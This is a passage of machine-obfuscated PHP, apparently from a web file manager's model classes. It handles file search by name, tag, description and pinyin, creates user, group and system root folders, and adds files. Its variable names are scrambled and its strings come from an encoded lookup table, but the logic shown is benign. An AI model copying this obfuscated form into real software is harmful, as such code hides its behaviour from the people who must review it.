$ÓÎ†ö¦ß[$”Øò¹†Á[412]][$”Øò¹†Á[413]] == 0) { $ÓÎ†ö¦ß = $this->distinct(!0)->field($Åí¯şÒ)->where($­¦Ü“ï“)->limit(1000)->select(); $ÓÎ†ö¦ß = array_page_split($ÓÎ†ö¦ß, !1, $¥Ü™şâş); } $this->_listSearchFileContent($ÓÎ†ö¦ß, $èÂæƒÑ¡, $–¸øÓò„, $­¦Ü“ï“); $this->_listSearchDesc($ÓÎ†ö¦ß, $èÂæƒÑ¡, $–¸øÓò„); $this->_listSearchTag($ÓÎ†ö¦ß, $èÂæƒÑ¡, $–¸øÓò„); $this->_listSearchGroupTag($ÓÎ†ö¦ß, $èÂæƒÑ¡, $–¸øÓò„); $this->_listDataApply($ÓÎ†ö¦ß[$”Øò¹†Á[415]]); $this->_listMake($ÓÎ†ö¦ß); return $ÓÎ†ö¦ß; } private function _listSearchFileContent(&$ÒöªúîÕ, $Õ¥èƒ€æ, $ÚËß¡—Ò, $˜‚ªßì¬) { $¬Ùğ­¬ö =& $_SERVER[Î‹ÃÂŞ„]; if (!$Õ¥èƒ€æ[$¬Ùğ­¬ö[1996]] || $ÒöªúîÕ[$¬Ùğ­¬ö[412]][$¬Ùğ­¬ö[399]] > 1) { return; } if (!isset($˜‚ªßì¬[$¬Ùğ­¬ö[32]]) || !is_array($Õ¥èƒ€æ[$¬Ùğ­¬ö[511]])) { return; } $˜‚ªßì¬[$¬Ùğ­¬ö[511]] = array($¬Ùğ­¬ö[7], $Õ¥èƒ€æ[$¬Ùğ­¬ö[511]]); unset($˜‚ªßì¬[$¬Ùğ­¬ö[32]]); unset($Õ¥èƒ€æ[$¬Ùğ­¬ö[511]]); $ş’º±¾ƒ = $this->field($ÚËß¡—Ò)->where($˜‚ªßì¬)->limit($¬Ùğ­¬ö[2162])->select(); if (!$ş’º±¾ƒ || count($ş’º±¾ƒ) == 0) { return; } $ÒöªúîÕ[$¬Ùğ­¬ö[415]] = array_merge($ş’º±¾ƒ, $ÒöªúîÕ[$¬Ùğ­¬ö[415]]); $ÒöªúîÕ[$¬Ùğ­¬ö[412]][$¬Ùğ­¬ö[413]] += count($ş’º±¾ƒ); } private function _listSearchTag(&$Ç»â¯Å‰, $š‹ıÄÈ·, $‚„ƒÈ´) { $’¿ƒ½Ì =& $_SERVER[Î‹ÃÂŞ„]; if (!$š‹ıÄÈ·[$’¿ƒ½Ì[1996]] || $Ç»â¯Å‰[$’¿ƒ½Ì[412]][$’¿ƒ½Ì[399]] > 1) { return; } $Çö½Ø = Model($’¿ƒ½Ì[2163])->listData(); $àüÂ…Ê = array(); $Øâ’ÒÅ€ = $š‹ıÄÈ·[$’¿ƒ½Ì[1996]]; foreach ($Çö½Ø as $ŒÔÈŠŒ®) { $ ”‘ÃÛÖ = $ŒÔÈŠŒ®[$’¿ƒ½Ì[32]]; $òº½ôÏ = str_replace($’¿ƒ½Ì[53], $’¿ƒ½Ì[12], Pinyin::get($ ”‘ÃÛÖ)); if (stripos($ ”‘ÃÛÖ, $Øâ’ÒÅ€) !== !1 || stripos($òº½ôÏ, $Øâ’ÒÅ€) !== !1) { $àüÂ…Ê[] = $ŒÔÈŠŒ®[$’¿ƒ½Ì[445]]; } } if (!$àüÂ…Ê) { return; } $‘­¼›ëê = array($’¿ƒ½Ì[470] => array($’¿ƒ½Ì[7], $àüÂ…Ê), $’¿ƒ½Ì[1704] => USER_ID); $­˜Ç¢¥¤ = Model($’¿ƒ½Ì[472])->field($’¿ƒ½Ì[86])->where($‘­¼›ëê)->select(); $­˜Ç¢¥¤ = array_to_keyvalue($­˜Ç¢¥¤, $’¿ƒ½Ì[12], $’¿ƒ½Ì[86]); $ãõ¼¢Á = array_unique($­˜Ç¢¥¤); $this->_listSearchMerge($Ç»â¯Å‰, $š‹ıÄÈ·, $‚„ƒÈ´, $ãõ¼¢Á); } private function _listSearchDesc(&$Ã“»„¿ü, $À•İÓÙ, $‘Ó¥Îø) { $ğ ª£“î =& $_SERVER[Î‹ÃÂŞ„]; if (!$À•İÓÙ[$ğ ª£“î[1996]] || $Ã“»„¿ü[$ğ ª£“î[412]][$ğ ª£“î[399]] > 1) { return; } $š½®Á‚¢ = array($ğ ª£“î[96] => $ğ ª£“î[496], $ğ ª£“î[420] => array($ğ ª£“î[429], $ğ ª£“î[1998] . $À•İÓÙ[$ğ ª£“î[1996]] . $ğ ª£“î[1998])); $İ±§Î†Ò = !1; if ($İ±§Î†Ò) { $¬¾Öœğ = $this->listSearchChildren($À•İÓÙ[$ğ ª£“î[182]]); $¬¾Öœğ = array_unique($¬¾Öœğ); if (!$¬¾Öœğ) { return; } $š½®Á‚¢[$ğ ª£“î[183]] = array($ğ ª£“î[7], $¬¾Öœğ); } $Êš¥é = Model($ğ ª£“î[603])->field($ğ ª£“î[183])->where($š½®Á‚¢)->limit(5000)->select(); $¤ÑöìÅÁ = array_to_keyvalue($Êš¥é, $ğ ª£“î[12], $ğ ª£“î[183]); $this->_listSearchMerge($Ã“»„¿ü, $À•İÓÙ, $‘Ó¥Îø, $¤ÑöìÅÁ); } private function _listSearchGroupTag(&$‡ó†ç³ã, $å¸·İÈ¸, $‡½ÏÉ´†) { $ÄƒĞ®Ã =& $_SERVER[Î‹ÃÂŞ„]; if (!$å¸·İÈ¸[$ÄƒĞ®Ã[1996]] || $‡ó†ç³ã[$ÄƒĞ®Ã[412]][$ÄƒĞ®Ã[399]] > 1 || !$å¸·İÈ¸[$ÄƒĞ®Ã[182]]) { return; } $—Êêòçå = $this->sourceInfo($å¸·İÈ¸[$ÄƒĞ®Ã[182]]); if (!$—Êêòçå || $—Êêòçå[$ÄƒĞ®Ã[180]] != SourceModel::TYPE_GROUP) { return; } $“¶Ä¡íç = $—Êêòçå[$ÄƒĞ®Ã[541]]; $Ò×ÌÈĞ = Model($ÄƒĞ®Ã[2164])->get($“¶Ä¡íç); $™õ½¿ïï = array(); $ğ­¤¨Úì = $å¸·İÈ¸[$ÄƒĞ®Ã[1996]]; foreach ($Ò×ÌÈĞ[$ÄƒĞ®Ã[415]] as $ñÁüñ) { $ÏŞ¿µ’Ğ = $ñÁüñ[$ÄƒĞ®Ã[32]]; $›îéàïê = str_replace($ÄƒĞ®Ã[53], $ÄƒĞ®Ã[12], Pinyin::get($ÏŞ¿µ’Ğ)); if (stripos($ÏŞ¿µ’Ğ, $ğ­¤¨Úì) !== !1 || stripos($›îéàïê, $ğ­¤¨Úì) !== !1) { $™õ½¿ïï[] = $ñÁüñ[$ÄƒĞ®Ã[445]]; } } if (!$™õ½¿ïï) { return; } $òÄÍä Ê = array($ÄƒĞ®Ã[470] => array($ÄƒĞ®Ã[7], $™õ½¿ïï), $ÄƒĞ®Ã[1704] => 0, $ÄƒĞ®Ã[33] => $ÄƒĞ®Ã[2018] . $“¶Ä¡íç); $Ë¬ç‚ğ¸ = Model($ÄƒĞ®Ã[472])->field($ÄƒĞ®Ã[86])->where($òÄÍä Ê)->select(); $Ë¬ç‚ğ¸ = array_to_keyvalue($Ë¬ç‚ğ¸, $ÄƒĞ®Ã[12], $ÄƒĞ®Ã[86]); $ÔáıÚ‡¸ = array_unique($Ë¬ç‚ğ¸); $this->_listSearchMerge($‡ó†ç³ã, $å¸·İÈ¸, $‡½ÏÉ´†, $ÔáıÚ‡¸); } private function _listSearchMerge(&$÷·ùòúƒ, $üøûû¢, $ğ¸Á¾Ê, $©¹°Ğ­¸) { $³ë±Ã‹û =& $_SERVER[Î‹ÃÂŞ„]; if (!$©¹°Ğ­¸) { return; } $«§›áÔ– = array_to_keyvalue($÷·ùòúƒ[$³ë±Ã‹û[415]], $³ë±Ã‹û[12], $³ë±Ã‹û[183]); $çÇï€·¿ = array_diff($©¹°Ğ­¸, $«§›áÔ–); if (!$çÇï€·¿) { return; } $‹ä­ØçÎ = array($³ë±Ã‹û[183] => array($³ë±Ã‹û[7], $çÇï€·¿)); $·ª»®º¼ = $this->field($ğ¸Á¾Ê)->where($‹ä­ØçÎ)->select(); if (!$·ª»®º¼) { return; } $²Å¬¾™™ = array(); foreach ($·ª»®º¼ as $ÆæèÊú) { if ($this->_listSearchFilter($ÆæèÊú, $üøûû¢)) { $²Å¬¾™™[] = $ÆæèÊú; } } $÷·ùòúƒ[$³ë±Ã‹û[415]] = array_merge($²Å¬¾™™, $÷·ùòúƒ[$³ë±Ã‹û[415]]); $÷·ùòúƒ[$³ë±Ã‹û[412]][$³ë±Ã‹û[413]] += count($²Å¬¾™™); } private function _listSearchFilter($ë÷„üèÁ, $Õë“”Ï¦) { $ºğ›ã¯Ò =& $_SERVER[Î‹ÃÂŞ„]; $ÒÛ•Î­é = $ë÷„üèÁ[$ºğ›ã¯Ò[455]] == $ºğ›ã¯Ò[90]; if (!strstr($ë÷„üèÁ[$ºğ›ã¯Ò[556]], $ºğ›ã¯Ò[50] . $Õë“”Ï¦[$ºğ›ã¯Ò[182]] . $ºğ›ã¯Ò[50])) { return !1; } if (isset($Õë“”Ï¦[$ºğ›ã¯Ò[456]]) && $Õë“”Ï¦[$ºğ›ã¯Ò[456]] != $ºğ›ã¯Ò[1957]) { if ($Õë“”Ï¦[$ºğ›ã¯Ò[456]] == $ºğ›ã¯Ò[77] && !$ÒÛ•Î­é) { return !1; } if ($Õë“”Ï¦[$ºğ›ã¯Ò[456]] != $ºğ›ã¯Ò[77] && $ÒÛ•Î­é) { return !1; } if (!strstr($ë÷„üèÁ[$ºğ›ã¯Ò[177]], $ºğ›ã¯Ò[50] . $Õë“”Ï¦[$ºğ›ã¯Ò[456]] . $ºğ›ã¯Ò[50])) { return !1; } } if (isset($Õë“”Ï¦[$ºğ›ã¯Ò[2165]]) && $Õë“”Ï¦[$ºğ›ã¯Ò[2165]] < $ë÷„üèÁ[$ºğ›ã¯Ò[78]]) { return !1; } if (isset($Õë“”Ï¦[$ºğ›ã¯Ò[2166]]) && $Õë“”Ï¦[$ºğ›ã¯Ò[2166]] > $ë÷„üèÁ[$ºğ›ã¯Ò[78]]) { return !1; } if (isset($Õë“”Ï¦[$ºğ›ã¯Ò[633]]) && $Õë“”Ï¦[$ºğ›ã¯Ò[633]] != $ë÷„üèÁ[$ºğ›ã¯Ò[499]]) { return !1; } return !0; } public function listSearchChildren($ÄÛ«¿ş, $ı›á‹ï = 5000) { $¤ñ“ş€ =& $_SERVER[Î‹ÃÂŞ„]; $İ‚¥í = array(); $ãÚÁ¤¨ = $this->sourceInfo($ÄÛ«¿ş); $Ô‡Ü¿õ = array($¤ñ“ş€[556] => array($¤ñ“ş€[429], $ãÚÁ¤¨[$¤ñ“ş€[556]] . $ãÚÁ¤¨[$¤ñ“ş€[183]] . $¤ñ“ş€[584])); $×ÕàÁ†£ = $this->field($¤ñ“ş€[78])->where($Ô‡Ü¿õ)->limit($ı›á‹ï + 1)->select(); $öè¡‚Ä‰ = is_array($×ÕàÁ†£) ? count($×ÕàÁ†£) : 0; if ($öè¡‚Ä‰ > $ı›á‹ï) { return $this->_listSearchChildrenNear($ÄÛ«¿ş, $ı›á‹ï); } $·‚œê“ = $this->field($¤ñ“ş€[183])->where($Ô‡Ü¿õ)->select(); $İ‚¥í = array_to_keyvalue($·‚œê“, $¤ñ“ş€[12], $¤ñ“ş€[183]); return $İ‚¥í; } private function _listSearchChildrenNear($…«·»Ú, $ Ú°±ÙĞ) { $“¤õèÀ =& $_SERVER[Î‹ÃÂŞ„]; $°²ˆşÃÈ = array(); $ˆÕ ŞÄÛ = array($“¤õèÀ[182] => $…«·»Ú); $¤½®·è = $this->field($“¤õèÀ[2167])->where($ˆÕ ŞÄÛ)->select(); $§ô–¾ª¶ = array_to_keyvalue(array_filter_by_field($¤½®·è, $“¤õèÀ[455], $“¤õèÀ[90]), $“¤õèÀ[12], $“¤õèÀ[183]); $°²ˆşÃÈ = array_merge($°²ˆşÃÈ, array_to_keyvalue($¤½®·è, $“¤õèÀ[12], $“¤õèÀ[183])); if (!$§ô–¾ª¶) { return $°²ˆşÃÈ; } $ˆÕ ŞÄÛ = array($“¤õèÀ[182] => array($“¤õèÀ[7], $§ô–¾ª¶)); $¤½®·è = $this->field($“¤õèÀ[2167])->where($ˆÕ ŞÄÛ)->limit($ Ú°±ÙĞ)->select(); $°²ˆşÃÈ = array_merge($°²ˆşÃÈ, array_to_keyvalue($¤½®·è, $“¤õèÀ[12], $“¤õèÀ[183])); $°²ˆşÃÈ = array_slice($°²ˆşÃÈ, 0, intval($ Ú°±ÙĞ)); return $°²ˆşÃÈ; } private function _listSearchBindPinyin($ÃË³›Âó, &$Øì¤ù¹‚, &$¥à‹ë¶í) { $¼…±½‡ =& $_SERVER[Î‹ÃÂŞ„]; if (!isset($ÃË³›Âó[$¼…±½‡[1996]]) || !$ÃË³›Âó[$¼…±½‡[1996]]) { return; } if (!Input::check($ÃË³›Âó[$¼…±½‡[1996]], $¼…±½‡[364]) || strlen($ÃË³›Âó[$¼…±½‡[1996]]) < 2) { return; } $Ÿ‘îÔ’Ù = "\114\105\106\x54\x20\x4a\x4f\111\x4e\40{$this->tablePrefix}\x69\157\137\163\157\165\162\143\145\137\x6d\x65\x74\141\40\155\x65\x74\141\x20\x6f\156\x20\x73\157\x75\162\143\x65\x2e\163\157\x75\x72\x63\145\x49\104\40\x3d\40\x6d\x65\x74\x61\x2e\163\157\x75\162\143\145\111\x44"; $ñ·ù£Ñ¦ = array(); $¥à‹ë¶í = str_replace(array($¼…±½‡[248], $¼…±½‡[53], $¼…±½‡[2168]), $¼…±½‡[12], $¥à‹ë¶í); $¥à‹ë¶í = $¼…±½‡[481] . str_replace($¼…±½‡[50], $¼…±½‡[482], $¥à‹ë¶í); $™Äååé = $Øì¤ù¹‚[$¼…±½‡[32]]; unset($Øì¤ù¹‚[$¼…±½‡[32]]); foreach ($Øì¤ù¹‚ as $ÅÈÍ² => $‹ë‚˜ Œ) { $ñ·ù£Ñ¦[$¼…±½‡[481] . $ÅÈÍ²] = $‹ë‚˜ Œ; } foreach ($™Äååé as $¬ã“üš·) { $ñ·ù£Ñ¦[] = array($¼…±½‡[486] => $¬ã“üš·, $¼…±½‡[1055] => $¼…±½‡[2000], array($¼…±½‡[2169] => $¬ã“üš·, $¼…±½‡[2170] => array($¼…±½‡[7], array($¼…±½‡[508], $¼…±½‡[507])))); } $this->join($Ÿ‘îÔ’Ù); $Øì¤ù¹‚ = $ñ·ù£Ñ¦; } private function _parseSearchWhere($šò¬­ı¥) { $üµ´Ì =& $_SERVER[Î‹ÃÂŞ„]; $Ï¸úÇ­´ = array(); if (isset($šò¬­ı¥[$üµ´Ì[807]]) && $šò¬­ı¥[$üµ´Ì[807]]) { $Ï¸úÇ­´[$üµ´Ì[87]] = array($üµ´Ì[2171], $šò¬­ı¥[$üµ´Ì[807]]); } if (isset($šò¬­ı¥[$üµ´Ì[808]]) && $šò¬­ı¥[$üµ´Ì[808]]) { $ıê…¨÷ = array($üµ´Ì[2172], $šò¬­ı¥[$üµ´Ì[808]]); if ($Ï¸úÇ­´[$üµ´Ì[87]]) { $Ï¸úÇ­´[$üµ´Ì[87]] = array($Ï¸úÇ­´[$üµ´Ì[87]], $ıê…¨÷, $üµ´Ì[2173]); } else { $Ï¸úÇ­´[$üµ´Ì[87]] = $ıê…¨÷; } } if (isset($šò¬­ı¥[$üµ´Ì[2165]]) && $šò¬­ı¥[$üµ´Ì[2165]] > 0) { $Ï¸úÇ­´[$üµ´Ì[78]] = array($üµ´Ì[2171], $šò¬­ı¥[$üµ´Ì[2165]]); } if (isset($šò¬­ı¥[$üµ´Ì[2166]]) && $šò¬­ı¥[$üµ´Ì[2166]]) { $ıê…¨÷ = array($üµ´Ì[2172], $šò¬­ı¥[$üµ´Ì[2166]]); if ($Ï¸úÇ­´[$üµ´Ì[78]]) { $Ï¸úÇ­´[$üµ´Ì[78]] = array($Ï¸úÇ­´[$üµ´Ì[78]], $ıê…¨÷, $üµ´Ì[2173]); } else { $Ï¸úÇ­´[$üµ´Ì[78]] = $ıê…¨÷; } } if (isset($šò¬­ı¥[$üµ´Ì[633]]) && $šò¬­ı¥[$üµ´Ì[633]]) { $Ï¸úÇ­´[] = array($üµ´Ì[499] => $šò¬­ı¥[$üµ´Ì[633]], $üµ´Ì[497] => $šò¬­ı¥[$üµ´Ì[633]], $üµ´Ì[1055] => $üµ´Ì[2000]); } if (isset($šò¬­ı¥[$üµ´Ì[456]]) && $šò¬­ı¥[$üµ´Ì[456]]) { $Ş¶­Ô£… = $šò¬­ı¥[$üµ´Ì[456]]; if ($Ş¶­Ô£… == $üµ´Ì[77]) { $Ï¸úÇ­´[$üµ´Ì[455]] = 1; } else { if ($Ş¶­Ô£… == $üµ´Ì[2174]) { $Ï¸úÇ­´[$üµ´Ì[455]] = 0; } else { if ($Ş¶­Ô£…) { $Ş¶­Ô£… = is_array($Ş¶­Ô£…) ? $Ş¶­Ô£… : explode($üµ´Ì[50], $Ş¶­Ô£…); $Ï¸úÇ­´[$üµ´Ì[456]] = array($üµ´Ì[462], $Ş¶­Ô£…); $Ï¸úÇ­´[$üµ´Ì[455]] = 0; } } } } $this->_parseSearchParent($šò¬­ı¥, $Ï¸úÇ­´); if (isset($šò¬­ı¥[$üµ´Ì[1996]]) && trim($šò¬­ı¥[$üµ´Ì[1996]])) { $ã›ñ¨·Ç = trim($šò¬­ı¥[$üµ´Ì[1996]]); $¶»ıõÎ = explode($üµ´Ì[53], $ã›ñ¨·Ç); if (strlen($ã›ñ¨·Ç) > 2 && (substr($ã›ñ¨·Ç, 0, 1) == $üµ´Ì[120] && substr($ã›ñ¨·Ç, -1) == $üµ´Ì[120]) || substr($ã›ñ¨·Ç, 0, 1) == $üµ´Ì[58] && substr($ã›ñ¨·Ç, -1) == $üµ´Ì[58]) { $ã›ñ¨·Ç = substr($ã›ñ¨·Ç, 1, -1); $¶»ıõÎ = array($ã›ñ¨·Ç); } $Ï¸úÇ­´[$üµ´Ì[32]] = array(array($üµ´Ì[583], $üµ´Ì[1998] . $ã›ñ¨·Ç . $üµ´Ì[1998])); if (count($¶»ıõÎ) > 1) { $Ï¸úÇ­´[$üµ´Ì[32]] = array(); foreach ($¶»ıõÎ as $ªûÒ’¯ß) { if (!trim($ªûÒ’¯ß)) { continue; } $Ï¸úÇ­´[$üµ´Ì[32]][] = array($üµ´Ì[583], $üµ´Ì[1998] . trim($ªûÒ’¯ß) . $üµ´Ì[1998]); } } } return $Ï¸úÇ­´; } private function _parseSearchParent($ÅÂæ×«‹, &$¤úù¾‚) { $—Ë©á¨Ô =& $_SERVER[Î‹ÃÂŞ„]; if (!isset($ÅÂæ×«‹[$—Ë©á¨Ô[182]]) || !$ÅÂæ×«‹[$—Ë©á¨Ô[182]]) { return; } $œõØ¨¢Ò = $this->pathInfo($ÅÂæ×«‹[$—Ë©á¨Ô[182]]); $Œ§Ãğªî = $œõØ¨¢Ò[$—Ë©á¨Ô[182]] . $—Ë©á¨Ô[12] === $—Ë©á¨Ô[214]; $ÆĞıÙ = $œõØ¨¢Ò[$—Ë©á¨Ô[180]] == $—Ë©á¨Ô[550]; if ($œõØ¨¢Ò[$—Ë©á¨Ô[567]] == $—Ë©á¨Ô[568]) { $¢ Ë¯¹É = $this->sourceInfo($ÅÂæ×«‹[$—Ë©á¨Ô[182]]); $œõØ¨¢Ò[$—Ë©á¨Ô[556]] = $¢ Ë¯¹É[$—Ë©á¨Ô[556]]; } $¤úù¾‚[$—Ë©á¨Ô[623]] = array($—Ë©á¨Ô[583], $œõØ¨¢Ò[$—Ë©á¨Ô[556]] . $ÅÂæ×«‹[$—Ë©á¨Ô[182]] . $—Ë©á¨Ô[584]); $³¡‰´Ã“ = isset($ÅÂæ×«‹[$—Ë©á¨Ô[1861]]) && in_array($—Ë©á¨Ô[550], $ÅÂæ×«‹[$—Ë©á¨Ô[1861]]); if (!$³¡‰´Ã“ || !$ÆĞıÙ || !$Œ§Ãğªî || !$œõØ¨¢Ò[$—Ë©á¨Ô[457]]) { return; } if (!AuthModel::authCheckRoot($œõØ¨¢Ò[$—Ë©á¨Ô[457]][$—Ë©á¨Ô[458]])) { return; } $ÕÂ±äüÜ = $œõØ¨¢Ò[$—Ë©á¨Ô[541]] . $—Ë©á¨Ô[12]; if ($ÕÂ±äüÜ == $—Ë©á¨Ô[90]) { unset($¤úù¾‚[$—Ë©á¨Ô[623]]); $¤úù¾‚[$—Ë©á¨Ô[180]] = self::TYPE_GROUP; return; } $ë”øÁ°ó = Model($—Ë©á¨Ô[557])->groupChildrenAll($ÕÂ±äüÜ); $ÓÄçÔ» = count($ë”øÁ°ó); if ($ÓÄçÔ» <= 1) { return; } $çÆáÁÚº = array($—Ë©á¨Ô[182] => 0, $—Ë©á¨Ô[180] => self::TYPE_GROUP, $—Ë©á¨Ô[541] => array($—Ë©á¨Ô[7], $ë”øÁ°ó)); $Ë ‹”µ = $this->field($—Ë©á¨Ô[2175])->where($çÆáÁÚº)->limit($ÓÄçÔ»)->select(); $¤úù¾‚[$—Ë©á¨Ô[623]] = array(); foreach ($Ë ‹”µ as $èû‚š ³) { $¤úù¾‚[$—Ë©á¨Ô[623]][] = array($—Ë©á¨Ô[583], $—Ë©á¨Ô[566] . $èû‚š ³[$—Ë©á¨Ô[183]] . $—Ë©á¨Ô[584]); } $¤úù¾‚[$—Ë©á¨Ô[623]][] = $—Ë©á¨Ô[2000]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($Ä´Ö®Ü€) { $¨ôû´¬í =& $_SERVER[Î‹ÃÂŞ„]; $Ğ¯¬‚ª = Model($¨ôû´¬í[549])->where(array($¨ôû´¬í[1695] => $Ä´Ö®Ü€))->find(); $Æ¯öÛ‹‘ = $this->_mkdirRoot(SourceModel::TYPE_USER, $Ä´Ö®Ü€, $Ğ¯¬‚ª[$¨ôû´¬í[32]]); $this->userDesktopAdd($Æ¯öÛ‹‘); return $Æ¯öÛ‹‘; } public function userDesktopAdd($°Ì¼ä‚–) { $¯Š°şÍğ =& $_SERVER[Î‹ÃÂŞ„]; $……½ÁÀ = LNG($¯Š°şÍğ[2176]); $Œ¡úšŒª = $this->mkdir($°Ì¼ä‚–, $……½ÁÀ); $this->metaSet($Œ¡úšŒª, $¯Š°şÍğ[2177], $¯Š°şÍğ[90]); $this->metaSet($°Ì¼ä‚–, $¯Š°şÍğ[2178], $Œ¡úšŒª); } public function userPathSafeAdd($Æ€¼È¿°) { $¡‡ê‘ûÏ =& $_SERVER[Î‹ÃÂŞ„]; $»Õ—º•† = Model($¡‡ê‘ûÏ[549])->getInfoFull($Æ€¼È¿°); if (!$»Õ—º•†) { return !1; } if (_get($»Õ—º•†, $¡‡ê‘ûÏ[571])) { return $»Õ—º•†[$¡‡ê‘ûÏ[509]][$¡‡ê‘ûÏ[2179]]; } $ÎÜ©ÔÛÈ = $this->_mkdirRoot(SourceModel::TYPE_USER, $Æ€¼È¿°, $¡‡ê‘ûÏ[2180], $¡‡ê‘ûÏ[476]); Model($¡‡ê‘ûÏ[549])->metaSet($Æ€¼È¿°, $¡‡ê‘ûÏ[2179], $ÎÜ©ÔÛÈ); $this->metaSet($ÎÜ©ÔÛÈ, $¡‡ê‘ûÏ[2181], $Æ€¼È¿°); return $ÎÜ©ÔÛÈ; } public function groupRootAdd($èãÖ¦½­) { $¹Ş½øÜÊ =& $_SERVER[Î‹ÃÂŞ„]; $‚à‹œÙÉ = Model($¹Ş½øÜÊ[557])->where(array($¹Ş½øÜÊ[1990] => $èãÖ¦½­))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $èãÖ¦½­, $‚à‹œÙÉ[$¹Ş½øÜÊ[32]]); } public function systemRootPathAdd($µ¢’¦Æ‹) { if ($µ¢’¦Æ‹ != $_SERVER[Î‹ÃÂŞ„][577]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $µ¢’¦Æ‹); } public function userRootRemove($û¹áèº ) { $ÀªŸ•¸ = $this->targetSourceRoot(SourceModel::TYPE_USER, $û¹áèº , !0); foreach ($ÀªŸ•¸ as $–ûˆÙ›Ì) { if (!$–ûˆÙ›Ì) { continue; } $this->remove($–ûˆÙ›Ì[$_SERVER[Î‹ÃÂŞ„][183]], !1); } } public function groupRootRemove($–ÜÂÃ—ƒ) { $¬¼¨¿íœ = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $–ÜÂÃ—ƒ); if (!$¬¼¨¿íœ) { return; } $this->remove($¬¼¨¿íœ[$_SERVER[Î‹ÃÂŞ„][183]], !1); } private function _mkdirRoot($¦ËğË®Á, $ŸÚïéôü, $şíî‚æ, $ãÍæö¹ç = '') { $¬ä¼¢ =& $_SERVER[Î‹ÃÂŞ„]; $ìªæ¡©ú = defined($¬ä¼¢[2124]) ? USER_ID : 0; $±‘¥éø = array($¬ä¼¢[447] => 0, $¬ä¼¢[619] => $¦ËğË®Á, $¬ä¼¢[620] => $ŸÚïéôü, $¬ä¼¢[617] => 1, $¬ä¼¢[621] => $ìªæ¡©ú, $¬ä¼¢[622] => $ìªæ¡©ú, $¬ä¼¢[618] => $ãÍæö¹ç, $¬ä¼¢[623] => $¬ä¼¢[566], $¬ä¼¢[474] => 0, $¬ä¼¢[588] => 0, $¬ä¼¢[512] => 0, $¬ä¼¢[624] => $¬ä¼¢[12]); if ($¯…ÓÓ· = $this->where($±‘¥éø)->find()) { return $¯…ÓÓ·[$¬ä¼¢[183]]; } $•ê¯áË¹ = "\115\x6f\144\x65\154\123\x6f\165\162\143\145\56\155\153\x64\x69\x72\x52\x6f\157\x74\56{$¦ËğË®Á}\x2e{$ŸÚïéôü}\x2e" . $şíî‚æ; CacheLock::lock($•ê¯áË¹); $±‘¥éø[$¬ä¼¢[32]] = $şíî‚æ; $¯¬ÛŞÛŸ = $this->add($±‘¥éø); $‹ÆêÆ‚Ÿ = array($¬ä¼¢[625] => short_id($¯¬ÛŞÛŸ)); $this->where(array($¬ä¼¢[461] => $¯¬ÛŞÛŸ))->save($‹ÆêÆ‚Ÿ); CacheLock::unlock($•ê¯áË¹); return $¯¬ÛŞÛŸ; } private function targetSourceRoot($àüì„úŒ, $Í©°ˆñ×, $ˆ¼Ï¿ß„ = false) { $Ú¼ºùã— =& $_SERVER[Î‹ÃÂŞ„]; $ß¢ÕªØŞ = array($Ú¼ºùã—[447] => 0, $Ú¼ºùã—[619] => $àüì„úŒ, $Ú¼ºùã—[620] => $Í©°ˆñ×); if ($ˆ¼Ï¿ß„) { $ÅöùÛìş = $this->where($ß¢ÕªØŞ)->select(); return $ÅöùÛìş ? $ÅöùÛìş : array(); } $³¤Ÿôèœ = $this->where($ß¢ÕªØŞ)->find(); return $³¤Ÿôèœ ? $³¤Ÿôèœ : array(); } public function sourceRootGroup($å©ãÅà) { $ÎıÌ·ßº =& $_SERVER[Î‹ÃÂŞ„]; if (is_string($å©ãÅà)) { $å©ãÅà = array($å©ãÅà); } $´‡åÕ¬Ì = $this->listSourceRoot(SourceModel::TYPE_GROUP, $å©ãÅà, $ÎıÌ·ßº[205]); $ÏÙåĞ¾ = array($ÎıÌ·ßº[415] => $´‡åÕ¬Ì, $ÎıÌ·ßº[412] => array($ÎıÌ·ßº[805] => count($å©ãÅà))); $this->_listDataApply($ÏÙåĞ¾[$ÎıÌ·ßº[415]]); $this->_listMake($ÏÙåĞ¾); return array_to_keyvalue($ÏÙåĞ¾[$ÎıÌ·ßº[84]], $ÎıÌ·ßº[541]); } public function mkfile($Ú¸·Úª®, $Ğ¿åğÖÃ, $Î¡ŸÜ‹ = '', $ä…ÑüÊÛ = REPEAT_RENAME) { $ˆº‰¶şø =& $_SERVER[Î‹ÃÂŞ„]; $à’ ™ö¾ = Model($ˆº‰¶şø[645])->addFileByContent($Î¡ŸÜ‹, $Ğ¿åğÖÃ); return $this->_createFileCall($Ú¸·Úª®, $Ğ¿åğÖÃ, $à’ ™ö¾, $ä…ÑüÊÛ, $ˆº‰¶şø[1398]); } public function addFile($Å÷Ş¹’, $åê¾–øÒ, $¡Ê¾ƒªª, $¾—¯‹ü³ = false, $Èéô‡ı€ = REPEAT_RENAME) { $Ÿ¬ÓÆò = Model($_SERVER[Î‹ÃÂŞ„][645])->addFile($åê¾–øÒ, $¡Ê¾ƒªª, $¾—¯‹ü³); return $this->_createFileCall($Å÷Ş¹’, $¡Ê¾ƒªª, $Ÿ¬ÓÆò, $Èéô‡ı€); } public function addFileByFileID($”Ôœ¬Ù, $½Á“Š, $á¦ƒô†Š, $Œ¾†îÅØ = REPEAT_RENAME) { $´õ¬®¾¹ =& $_SERVER[Î‹ÃÂŞ„]; $¾„Š°ëÁ = Model($´õ¬®¾¹[645])->find($½Á“Š); Model($´õ¬®¾¹[645])->linkAdd($½Á“Š); return $this->_createFileCall($”Ôœ¬Ù, $á¦ƒô†Š, $¾„Š°ëÁ, $Œ¾†îÅØ); } public function addFileByRemote($²¬áä·€, $ÖçØğâ, $ÌüèË, $”‚º‘ § = array(), $˜•¯í¤ = REPEAT_RENAME) { $’Æöä¥ = Model($_SERVER[Î‹ÃÂŞ„][645])->addFileByRemote($ÖçØğâ, $ÌüèË, $”‚º‘ §); return $this->_createFileCall($²¬áä·€, $ÌüèË, $’Æöä¥, $˜•¯í¤); } private function _createFileCall($€¥®‹ëê, $Ö½šøÈ, $¯Ü±ïŒ©, $‹Œú¦¬, $ÔÛæëµü = "\165\160\154\157\141\x64") { $€‰©ó™ =& $_SERVER[Î‹ÃÂŞ„]; $ûÌªÁ = !1; $this->setMasterDB(); $this->lockWriteStart($€¥®‹ëê, $Ö½šøÈ); $ŒÊü«ò‘ = $this->fileNameExist($€¥®‹ëê, $Ö½šøÈ); $Ÿ‡ˆúéÏ = $this->_createFile($€¥®‹ëê, 